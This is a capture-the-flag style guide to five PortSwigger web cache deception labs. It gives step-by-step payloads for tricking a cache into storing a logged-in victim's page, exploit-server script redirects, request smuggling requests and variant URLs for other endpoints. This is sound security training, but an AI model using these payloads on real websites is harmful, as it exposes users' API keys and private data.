# Web Cache Deception - PortSwigger Labs Complete Guide

## Table of Contents
1. [Lab Overview](#lab-overview)
2. [Lab 1: Exploiting Path Mapping](#lab-1-exploiting-path-mapping)
3. [Lab 2: Exploiting Path Delimiters](#lab-2-exploiting-path-delimiters)
4. [Lab 3: Exploiting Origin Server Normalization](#lab-3-exploiting-origin-server-normalization)
5. [Lab 4: Exploiting Cache Server Normalization](#lab-4-exploiting-cache-server-normalization)
6. [Lab 5: HTTP Request Smuggling for Cache Deception](#lab-5-http-request-smuggling-for-cache-deception)

---

## Lab Overview

Web cache deception labs are based on original research presented at Black Hat USA 2024. These labs exploit discrepancies between how cache servers and origin servers interpret URLs, allowing attackers to cache sensitive dynamic content and retrieve it later.

**Common Objective:** Find the API key for user `carlos` by exploiting web cache deception vulnerabilities.

**Default Credentials:** `wiener:peter`

---

## Lab 1: Exploiting Path Mapping

### Difficulty
**Apprentice**

### Vulnerability Description
This lab exploits path mapping discrepancies where the cache and origin server interpret request paths differently. The origin server uses REST-style URL mapping that abstracts the path, while the cache uses file extension-based rules.

### Step-by-Step Solution

#### 1. Identify the Target Endpoint
- Log in with credentials `wiener:peter`
- Navigate to `/my-account`
- Observe that the response includes your API key
- Note the account details displayed

#### 2. Detect the Path Mapping Discrepancy

**Test path abstraction:**
```http
GET /my-account/abc HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
**Response:** Returns your API key (origin server abstracts the path)

**Test with static extension:**
```http
GET /my-account/abc.js HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
**Response:**
- First request: `X-Cache: miss`, `Cache-Control: max-age=30`
- Second request (within 30 seconds): `X-Cache: hit`

**Key Finding:** The cache treats `.js` extensions as static files (cacheable), but the origin server still serves the dynamic `/my-account` page.

#### 3. Craft the Exploit

Create a unique path segment to avoid cache collisions:
```
https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js
```

#### 4. Deliver the Payload

Deploy to the exploit server:
```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js"</script>
```

**Explanation:** When `carlos` clicks "Deliver exploit to victim," his browser requests the malicious URL while authenticated, causing his API key to be cached.

#### 5. Retrieve the Cached Response

Navigate directly to:
```
https://YOUR-LAB-ID.web-security-academy.net/my-account/wcd.js
```

Extract the API key from the cached response.

### HTTP Requests/Responses

**Attacker's Test Request:**
```http
GET /my-account/test.js HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=wiener-session-token
```

**Response (First Request):**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: max-age=30
X-Cache: miss

<div>Your API Key: wiener-api-key-12345</div>
```

**Response (Second Request within TTL):**
```http
HTTP/1.1 200 OK
Content-Type: text/html
Cache-Control: max-age=30
X-Cache: hit

<div>Your API Key: wiener-api-key-12345</div>
```

### Burp Suite Features Employed

1. **Proxy → HTTP History**
   - Monitor requests to `/my-account`
   - Identify cache headers (`X-Cache`, `Cache-Control`)

2. **Repeater**
   - Test path variations (`/my-account/abc`, `/my-account/abc.js`)
   - Verify caching behavior by resending requests
   - Confirm cache TTL timing

3. **Exploit Server**
   - Store malicious JavaScript redirect
   - Deliver payload to victim user

### Common Mistakes and Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Seeing your own API key | Reusing path segments | Use unique paths per victim (e.g., `/my-account/carlos123.js`) |
| Cache not storing response | TTL expired | Send exploit immediately after confirming caching behavior |
| Lab not solving | Wrong URL format | Verify lab ID and endpoint path are correct |
| No `X-Cache` header visible | Missing Burp configuration | Check Proxy settings show all headers |

### Attack Variations

**Alternative Extensions:**
- `/my-account/data.css` (CSS files)
- `/my-account/script.js` (JavaScript)
- `/my-account/image.png` (Images)
- `/my-account/style.ico` (Icons)

**Alternative Paths:**
- `/api/user/profile.js`
- `/account/settings.css`
- `/user/details.json`

---

## Lab 2: Exploiting Path Delimiters

### Difficulty
**Practitioner**

### Vulnerability Description
This lab exploits delimiter discrepancies where the origin server recognizes certain characters (`;`, `?`) as path delimiters, but the cache ignores them. Combined with static file extension rules, this allows sensitive content to be cached.

### Step-by-Step Solution

#### 1. Identify the Target
- Log in as `wiener:peter`
- Access `/my-account` endpoint
- Confirm API key is displayed in response

#### 2. Discover Path Delimiters (Origin Server)

**Test basic path abstraction:**
```http
GET /my-account/abc HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
**Response:** `404 Not Found` (origin server doesn't abstract paths)

**Use Burp Intruder to test delimiters:**

Configure Sniper attack:
- Payload position: `/my-account§§abc`
- Payloads: `! " # $ % & ' ( ) * + , - . / : ; < = > ? @ [ \ ] ^ _ \` { | } ~`

**Results:**
- `;` → `200 OK` with API key
- `?` → `200 OK` with API key
- Other characters → `404`

#### 3. Test Cache Behavior

**Test with `?` delimiter:**
```http
GET /my-account?abc.js HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
**Result:** No caching (cache also recognizes `?` as delimiter)

**Test with `;` delimiter:**
```http
GET /my-account;abc.js HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
**Response:**
- First request: `X-Cache: miss`
- Second request: `X-Cache: hit` ✓

**Critical Insight:** Cache ignores `;` delimiter but respects `.js` extension for caching rules.

#### 4. Craft Exploit Payload

```
https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js
```

**URL Breakdown:**
- `/my-account` — Dynamic endpoint (origin server interpretation)
- `;` — Delimiter ignored by cache, recognized by origin
- `wcd.js` — Static extension triggers cache rule

#### 5. Deliver Attack

Deploy via exploit server:
```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account;wcd.js"</script>
```

Deliver to victim `carlos`, then access the same URL to retrieve cached API key.

### HTTP Requests/Responses

**Delimiter Discovery Request:**
```http
GET /my-account;test HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=authenticated-session
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<div>Your API Key: your-key-here</div>
```

**Cache Test Request:**
```http
GET /my-account;test.js HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=authenticated-session
```

**Response (Cached):**
```http
HTTP/1.1 200 OK
X-Cache: hit
Cache-Control: max-age=30
Content-Type: text/html

<div>Your API Key: your-key-here</div>
```

### Burp Suite Features Employed

1. **Intruder (Sniper Attack)**
   - Automate delimiter discovery
   - Test all special characters systematically
   - Identify which delimiters return 200 responses

2. **Repeater**
   - Manually test cache behavior with different delimiters
   - Verify `X-Cache` headers
   - Confirm caching with static extensions

3. **Proxy → HTTP History**
   - Review all requests and responses
   - Identify successful delimiter combinations

### Common Mistakes and Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Intruder returns all 404s | Incorrect payload position | Ensure position is `/my-account§§abc`, not `/my-account/§§abc` |
| Cache not triggering | Using `?` instead of `;` | Verify delimiter is ignored by cache but recognized by origin |
| Payload encoding issues | Burp auto-encodes special characters | Disable URL encoding in Intruder settings |
| Can't find victim's key | Cache collision | Use unique identifiers in path (e.g., `;carlos-wcd.js`) |

### Attack Variations

**Different Delimiters (Framework-Specific):**
- `;` — Java Spring (matrix variables)
- `.` — Ruby on Rails (format specifications)
- `:` — Some custom frameworks
- `%00` — Null byte (when not normalized)

**Combined with Extensions:**
- `/api/user;data.css`
- `/profile;info.json`
- `/account;details.xml`

---

## Lab 3: Exploiting Origin Server Normalization

### Difficulty
**Practitioner**

### Vulnerability Description
This lab exploits normalization discrepancies where the origin server decodes URL-encoded characters and resolves dot-segments (`..`), while the cache treats them literally. Combined with static directory rules, this allows path traversal to sensitive endpoints.

### Step-by-Step Solution

#### 1. Identify Target Endpoint
- Log in with `wiener:peter`
- Access `/my-account`
- Confirm API key appears in response

#### 2. Investigate Path Delimiter Discrepancies

**Test basic path extension:**
```http
GET /my-account/abc HTTP/1.1
```
**Response:** `404 Not Found`

**Test path concatenation:**
```http
GET /my-accountabc HTTP/1.1
```
**Response:** `404 Not Found`, no caching

**Use Intruder for delimiter discovery:**
- Position: `/my-account§§abc`
- Payload: Delimiter list from PortSwigger

**Result:** Only `?` returns `200` with API key

#### 3. Investigate Normalization Discrepancies

**Test encoded path traversal:**
```http
GET /aaa/..%2fmy-account HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```
**Response:** `200 OK` with API key

**Analysis:**
- Origin server decodes `%2f` to `/`
- Origin server resolves `..` (dot-segment)
- Final path: `/my-account`

#### 4. Identify Cache Rules

**Test static directory:**
```http
GET /resources/test-file HTTP/1.1
```
**Observe:** Requests to `/resources` show caching headers

**Test path traversal from static directory:**
```http
GET /resources/..%2fmy-account HTTP/1.1
```
**Response:**
- First request: `X-Cache: miss`, `200 OK` with API key
- Second request: `X-Cache: hit`

**Key Finding:** Cache sees `/resources/...` as matching static directory rule, but origin normalizes to `/my-account`.

#### 5. Craft Exploit

**Payload:**
```
https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd
```

**URL Breakdown:**
- `/resources/` — Matches cache's static directory rule
- `..%2f` — Traverses up one directory (after normalization)
- `my-account` — Target sensitive endpoint
- `?wcd` — Cache buster to avoid collisions

#### 6. Deliver Attack

Deploy to exploit server:
```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/resources/..%2fmy-account?wcd"</script>
```

Deliver to victim, then access same URL to retrieve cached API key.

### HTTP Requests/Responses

**Normalization Test:**
```http
GET /aaa/..%2fmy-account HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=authenticated-session
```

**Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html

<div>Your API Key: user-key-12345</div>
```

**Cache Exploitation Request:**
```http
GET /resources/..%2fmy-account?carlos HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=carlos-session
```

**Response (First):**
```http
HTTP/1.1 200 OK
X-Cache: miss
Cache-Control: max-age=30

<div>Your API Key: carlos-api-key-67890</div>
```

**Response (Second):**
```http
HTTP/1.1 200 OK
X-Cache: hit
Cache-Control: max-age=30

<div>Your API Key: carlos-api-key-67890</div>
```

### Burp Suite Features Employed

1. **Repeater**
   - Test normalization behavior
   - Verify dot-segment resolution
   - Confirm caching with `X-Cache` headers

2. **Intruder**
   - Automate delimiter discovery
   - Test multiple path traversal combinations
   - Identify cache rules for different directories

3. **Decoder**
   - URL-encode slash characters (`/` → `%2f`)
   - Verify encoding/decoding behavior

### Common Mistakes and Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| `404` instead of `200` | Not URL-encoding slash | Use `%2f` instead of `/` for dot-segments |
| No caching detected | Wrong static directory | Test different directories (`/assets`, `/static`, `/public`) |
| Origin doesn't normalize | Framework doesn't support | Verify with simple test: `/aaa/..%2fresources/file` |
| Cache buster not working | Reusing same parameter | Use unique values per victim (e.g., `?carlos`, `?victim2`) |

### Attack Variations

**Different Static Directories:**
- `/assets/..%2fprofile`
- `/static/..%2fapi/user`
- `/public/..%2fmy-account`
- `/img/..%2fadmin/dashboard`

**Multiple Traversals:**
- `/resources/subdir/..%2f..%2fmy-account`
- `/static/css/..%2f..%2fapi/keys`

**Combined with Query Parameters:**
- `/resources/..%2fmy-account?format=json`
- `/assets/..%2fprofile?detailed=true`

---

## Lab 4: Exploiting Cache Server Normalization

### Difficulty
**Practitioner**

### Vulnerability Description
This lab exploits the inverse scenario: the cache server normalizes URL-encoded characters and resolves dot-segments, while the origin server does not. This allows attackers to bypass path delimiters through encoding and path traversal.

### Step-by-Step Solution

#### 1. Identify Target Endpoint
- Log in with `wiener:peter`
- Navigate to `/my-account`
- Confirm API key is present in response

#### 2. Discover Path Delimiters

**Use Burp Intruder (Sniper attack):**
- Position: `/my-account§§abc`
- Payloads: Delimiter list (including URL-encoded versions)

**Results:**
- `#` → `200 OK` (but browser processes it before cache)
- `?` → `200 OK`
- `%23` → `200 OK` (URL-encoded `#`)
- `%3f` → `200 OK` (URL-encoded `?`)

#### 3. Test Delimiter Discrepancies

**Test with `?`:**
```http
GET /my-account?abc.js HTTP/1.1
```
**Result:** No caching (both systems recognize `?`)

**Test with `%23`:**
```http
GET /my-account%23abc.js HTTP/1.1
```
**Result:** No caching

**Test with `%3f`:**
```http
GET /my-account%3fabc.js HTTP/1.1
```
**Result:** No caching

**Analysis:** Cache also decodes and recognizes encoded delimiters.

#### 4. Investigate Normalization

**Test origin server normalization:**
```http
GET /aaa/..%2fmy-account HTTP/1.1
```
**Response:** `404 Not Found` (origin doesn't normalize)

**Test with static directory:**
```http
GET /aaa/..%2fresources/resource-file HTTP/1.1
```
**Response:** `X-Cache: miss`, then `hit` (cache normalizes!)

**Key Finding:** Cache decodes `%2f` and resolves `..` segments.

#### 5. Craft Exploit Payload

**Working payload:**
```
https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd
```

**URL Breakdown:**
- `/my-account` — Sensitive endpoint
- `%23` — Encoded `#` (delimiter for origin server)
- `%2f%2e%2e%2f` — Encoded `/../` (normalized by cache)
- `resources` — Matches cache's static directory rule
- `?wcd` — Cache buster

**How it works:**
1. Origin server sees: `/my-account` (stops at `%23` delimiter)
2. Cache sees: `/my-account#/../resources?wcd` → normalizes to `/resources?wcd`
3. Cache rule matches `/resources` → caches response
4. Response contains `/my-account` data

#### 6. Deliver Attack

Deploy via exploit server:
```html
<script>document.location="https://YOUR-LAB-ID.web-security-academy.net/my-account%23%2f%2e%2e%2fresources?wcd"</script>
```

### HTTP Requests/Responses

**Delimiter Discovery:**
```http
GET /my-account%23test HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=authenticated
```

**Response:**
```http
HTTP/1.1 200 OK

<div>Your API Key: key-here</div>
```

**Exploitation Request:**
```http
GET /my-account%23%2f%2e%2e%2fresources?victim HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=victim-session
```

**Response (First):**
```http
HTTP/1.1 200 OK
X-Cache: miss
Cache-Control: max-age=30

<div>Your API Key: victim-key-67890</div>
```

**Response (Second):**
```http
HTTP/1.1 200 OK
X-Cache: hit
Cache-Control: max-age=30

<div>Your API Key: victim-key-67890</div>
```

### Burp Suite Features Employed

1. **Intruder (Sniper Attack)**
   - Test all delimiters systematically
   - Include URL-encoded versions in payload list
   - Identify delimiter discrepancies

2. **Repeater**
   - Test normalization behavior
   - Verify cache behavior with encoded characters
   - Confirm `X-Cache` headers

3. **Decoder**
   - Encode special characters for testing
   - Verify double-encoding if needed

### Common Mistakes and Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Using raw `#` character | Browser strips fragment | Always use `%23` encoded version |
| No caching detected | Wrong traversal direction | Test both `/my-account%23/../resources` and variations |
| Incorrect encoding | Single-encoded characters | Ensure proper URL encoding: `%2f%2e%2e%2f` for `/../` |
| Cache sees delimiter | Using non-normalized delimiter | Find delimiters that origin recognizes but cache normalizes |

### Attack Variations

**Different Delimiter + Traversal Combinations:**
- `/profile%23%2f%2e%2e%2fassets?id=1`
- `/api/user%23%2f%2e%2e%2fstatic?data=true`
- `/account%3b%2f%2e%2e%2fpublic?key=val`

**Multiple Encoding Levels:**
- `/my-account%2523%252f%252e%252e%252fresources` (double-encoded)
- `/profile%23%252f..%252fresources` (mixed encoding)

---

## Lab 5: HTTP Request Smuggling for Cache Deception

### Difficulty
**Practitioner**

### Vulnerability Description
This advanced lab combines HTTP request smuggling (CL.TE vulnerability) with web cache deception. The front-end uses Content-Length, while the back-end processes Transfer-Encoding chunks, allowing attackers to smuggle requests that poison the cache with victims' sensitive data.

### Step-by-Step Solution

#### 1. Authenticate and Identify Target
- Log in with `wiener:peter`
- Navigate to `/my-account`
- Observe response contains API key
- Note: Response lacks anti-caching headers

#### 2. Identify Request Smuggling Vulnerability

**Test CL.TE vulnerability:**

The lab uses a front-end that prioritizes `Content-Length` and a back-end that processes `Transfer-Encoding: chunked`.

#### 3. Craft Smuggling Payload

**Exploit request:**
```http
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked

0

GET /my-account HTTP/1.1
X-Ignore: X
```

**Explanation:**
- Front-end reads 42 bytes (entire body)
- Back-end processes chunked encoding
- `0` chunk signals end of chunked body
- `GET /my-account` becomes the "next" request
- `X-Ignore: X` catches leftover headers from subsequent requests

#### 4. Deliver the Attack

**Steps:**
1. Send smuggling payload in Burp Repeater
2. Repeat multiple times to increase success probability
3. Wait for victim user to visit homepage
4. Victim's request gets appended to smuggled GET
5. Response containing victim's API key gets cached

#### 5. Retrieve Cached Response

**Method 1: Browse in incognito**
- Open incognito/private window
- Navigate to homepage
- Check if response contains API key

**Method 2: Use Burp Search**
- Proxy → HTTP History
- Search for "Your API Key"
- Examine cached responses

### HTTP Requests/Responses

**Smuggling Request:**
```http
POST / HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 42
Transfer-Encoding: chunked
Cookie: session=attacker-session

0

GET /my-account HTTP/1.1
X-Ignore: X
```

**What front-end sees:**
```
POST / [complete request with body ending after X-Ignore: X]
```

**What back-end sees:**
```
Request 1: POST / [chunked body ends at 0]
Request 2: GET /my-account [begins immediately after]
```

**Victim's Request (subsequent):**
```http
GET / HTTP/1.1
Host: vulnerable-site.web-security-academy.net
Cookie: session=victim-session
```

**What happens:**
- Victim's headers get appended to smuggled `GET /my-account`
- Back-end processes as: `GET /my-account ... Host: vulnerable-site ... Cookie: session=victim-session`
- Response contains victim's API key
- Cache stores response (no anti-caching headers)

**Cached Response:**
```http
HTTP/1.1 200 OK
Content-Type: text/html
X-Cache: hit

<div>Your API Key: victim-api-key-12345</div>
```

### Burp Suite Features Employed

1. **Repeater**
   - Craft and send smuggling payloads
   - Switch to HTTP/1 protocol (required)
   - Repeat attack multiple times

2. **HTTP Request Smuggler Extension**
   - Automatically detect smuggling vulnerabilities
   - Calculate correct Content-Length values
   - Generate smuggling payloads

3. **Proxy → HTTP History**
   - Monitor all requests and responses
   - Search for cached victim data

4. **Search Function**
   - Search term: "Your API Key" or "carlos"
   - Locate cached responses across history

### Common Mistakes and Troubleshooting

| Issue | Cause | Solution |
|-------|-------|----------|
| Request not smuggling | Using HTTP/2 | Switch to HTTP/1 in Repeater |
| Content-Length incorrect | Manual calculation error | Use HTTP Request Smuggler extension |
| No victim response cached | Timing mismatch | Repeat smuggling payload 5-10 times |
| Cache not storing response | Anti-caching headers present | Verify target endpoint lacks `Cache-Control: no-store` |
| Can't find API key | Not searching correctly | Use Burp's Search (Ctrl+Shift+F), search "Your API Key" |
| Payload rejected | Extra whitespace | Ensure no extra spaces after `0` chunk |

### Attack Variations

**Different Smuggling Techniques:**

**CL.TE (Content-Length to Transfer-Encoding):**
```http
POST / HTTP/1.1
Content-Length: 42
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```

**TE.CL (Transfer-Encoding to Content-Length):**
```http
POST / HTTP/1.1
Transfer-Encoding: chunked
Content-Length: 4

5c
GET /admin HTTP/1.1
Host: vulnerable-site
0


```

**Different Endpoints to Cache:**
- `/api/keys` — API keys
- `/profile` — User profiles
- `/admin/users` — Administrative data
- `/settings` — Configuration data

---

## General Tips for All Labs

### Cache Header Analysis

**Key Headers to Monitor:**
- `X-Cache: hit` — Response served from cache
- `X-Cache: miss` — Response not in cache, fetched from origin
- `Cache-Control: max-age=30` — Cache TTL (time-to-live)
- `Cache-Control: no-store` — Explicitly not cached
- `Cache-Control: private` — Only client should cache

### Burp Suite Workflow

1. **Reconnaissance Phase**
   - Map application structure
   - Identify sensitive endpoints
   - Check for cache headers

2. **Testing Phase**
   - Test path abstraction
   - Discover delimiters
   - Identify normalization behavior
   - Verify cache rules

3. **Exploitation Phase**
   - Craft unique payloads
   - Deliver via exploit server
   - Retrieve cached responses

4. **Verification Phase**
   - Confirm cache hit
   - Extract sensitive data
   - Submit solution

### Payload Construction Best Practices

1. **Use Unique Identifiers**
   - Avoid cache collisions
   - Make each attack distinct
   - Example: `wcd`, `carlos-test`, `victim1`

2. **Verify Encoding**
   - Use Burp Decoder for accuracy
   - Test both encoded and unencoded versions
   - Check framework-specific parsing

3. **Test Systematically**
   - Start with simple payloads
   - Add complexity incrementally
   - Document what works

4. **Monitor Cache Behavior**
   - Always check `X-Cache` headers
   - Verify TTL timing
   - Confirm cache hits

### Real-World Application Scenarios

**Financial Applications:**
- Caching bank account details
- Exposing transaction histories
- Leaking credit card information

**Healthcare Systems:**
- Patient records exposure
- Medical history leakage
- Insurance information disclosure

**E-commerce Platforms:**
- Order details leakage
- Payment information exposure
- Customer PII compromise

**Social Media:**
- Private messages cached
- Personal profile data exposed
- Friend lists and connections leaked

**Enterprise Systems:**
- Employee data exposure
- Salary information leakage
- Internal communications cached

---

## Summary Table

| Lab | Difficulty | Technique | Key Concept |
|-----|-----------|-----------|-------------|
| Path Mapping | Apprentice | Static extension caching | Origin abstracts path, cache uses extension |
| Path Delimiters | Practitioner | Delimiter discrepancy | Cache ignores `;`, origin recognizes it |
| Origin Normalization | Practitioner | Origin decodes & resolves | Origin normalizes `..%2f`, cache doesn't |
| Cache Normalization | Practitioner | Cache decodes & resolves | Cache normalizes `%23%2f%2e%2e%2f`, origin doesn't |
| Request Smuggling | Practitioner | CL.TE smuggling + caching | Smuggle GET request to poison cache |

---

## Additional Resources

- **PortSwigger Research:** "Gotta cache 'em all: bending the rules of web cache exploitation"
- **Delimiter List:** https://portswigger.net/web-security/web-cache-deception/wcd-lab-delimiter-list
- **Burp Extension:** Web Cache Deception Scanner BApp
- **Learning Path:** https://portswigger.net/web-security/learning-paths/web-cache-deception
